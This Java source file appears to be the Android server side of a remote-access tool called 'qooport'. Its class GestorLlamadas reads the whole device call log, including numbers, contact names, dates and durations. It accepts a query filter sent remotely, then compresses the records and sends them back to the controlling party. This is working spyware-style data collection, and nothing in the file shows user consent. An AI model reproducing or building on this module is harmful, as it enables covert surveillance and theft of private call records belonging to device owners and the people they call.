package com.qooport.android.servidor;
import java.util.ArrayList;
import android.database.Cursor;
import android.provider.CallLog;
import comunes.Llamada;
import com.qooport.android.Servicio;
import com.qooport.android.utilidades.Protocolo;
public class GestorLlamadas {
    public static boolean listarLlamadas(Servicio c, byte[] args) {
        ArrayList<Llamada> l = new ArrayList<Llamada>();
        boolean ret = false;
        String WHERE_CONDITION;
        if (args != null) {
            WHERE_CONDITION = new String(args);
        } else {
            WHERE_CONDITION = "";
        }
        String SORT_ORDER = "date DESC";
        String[] column = {"_id", "type", "date", "duration", "number", "name", "raw_contact_id"};
        Cursor cursor = c.getContexto().getContentResolver().query(CallLog.Calls.CONTENT_URI, column, WHERE_CONDITION, null, SORT_ORDER);
        if (cursor.getCount() != 0) {
            cursor.moveToFirst();
            do {
                if (cursor.getColumnCount() != 0) {
                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
                    int type = cursor.getInt(cursor.getColumnIndex("type"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    long duration = cursor.getLong(cursor.getColumnIndex("duration"));
                    String number = cursor.getString(cursor.getColumnIndex("number"));
                    String name = cursor.getString(cursor.getColumnIndex("name"));
                    int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
                    l.add(new Llamada(id, type, date, duration, number, name, raw_contact_id));
                }
            } while (cursor.moveToNext());
            ret = true;
        } else {
            ret = false;
        }
        c.enviarComando(Protocolo.listarLlamadas);
        c.enviarObjeto(c.comprimirObjecto(l));
        return ret;
    }
}
